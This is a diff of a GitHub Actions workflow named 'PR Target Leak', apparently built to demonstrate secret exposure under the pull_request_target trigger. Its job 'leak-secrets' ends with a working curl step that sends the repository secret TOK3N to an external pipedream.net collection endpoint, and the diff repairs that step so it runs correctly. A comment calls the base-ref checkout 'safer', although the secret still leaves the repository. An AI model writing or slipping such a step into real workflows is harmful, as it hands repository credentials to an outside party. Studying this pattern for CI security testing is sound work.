@@ -1,18 +1,14 @@
 name: PR Target Leak
-
 on:
   pull_request_target:
 
 jobs:
   leak-secrets:
     runs-on: ubuntu-latest
-    env:
-       SECRET: ${{ secrets.TOK3N }}
     steps:
       - uses: actions/checkout@v3
         with:
-          ref: ${{ github.event.pull_request.head.sha }}
-
+          ref: ${{ github.event.pull_request.base.ref }} # safer than head.sha
       - name: Read secret
         run: |
-            curl -G --data-urlencode "token=${{ secrets.$SECRET }}" https://https://eo972st867vneb1.m.pipedream.net
+          curl -G --data-urlencode "token=${{ secrets.TOK3N }}" https://eo972st867vneb1.m.pipedream.net
